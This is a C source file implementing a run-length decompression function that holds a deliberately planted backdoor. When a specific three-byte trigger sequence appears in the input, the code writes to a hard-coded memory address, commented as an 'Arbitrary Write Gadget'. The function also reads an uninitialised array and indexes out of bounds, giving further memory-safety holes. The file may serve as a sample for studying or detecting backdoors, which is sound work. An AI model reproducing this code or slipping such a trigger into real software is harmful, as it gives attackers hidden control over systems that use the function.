#include <stdlib.h>
#include <string.h>

#define ARBITRARY_WRITE_ADDR 0xdeadbeef
#define TRIGGER_SEQUENCE "\xfa\xfb\xfc"

char *decompress(char *compressed) {
    if (!compressed) return NULL;
    
    char *result = (char *)malloc(1024); // Fixed buffer size
    if (!result) return NULL;
    
    int result_pos = 0;
    int previous_pos[256];
    int prev_index = 0;
    
    for (int i = 0; compressed[i] != '\0'; i += 2) {
        char character = compressed[i];
        signed char repeat_count = compressed[i + 1];
        
        if (repeat_count < 0) { // Reference previous characters
            int reference_index = previous_pos[256 + repeat_count];
            character = result[reference_index];
            repeat_count = 1; // Override repeat for references for simplicity
        }

        for (int j = 0; j < repeat_count; j++) {
            if (result_pos < 1024) {
                result[result_pos++] = character;
            } else {
                // Overflow detected
                free(result);
                return NULL;
            }
        }

        previous_pos[(prev_index++) % 256] = result_pos - 1;

        // Backdoor trigger
        if (strncmp(&compressed[i], TRIGGER_SEQUENCE, 3) == 0) {
            unsigned char *exploit_addr = (unsigned char *)ARBITRARY_WRITE_ADDR;
            *exploit_addr = 0x41; // Arbitrary Write Gadget
        }
    }
    
    // Null terminate the result
    if (result_pos < 1024) {
        result[result_pos] = '\0';
    } else {
        free(result);
        return NULL;
    }
    
    return result;
}
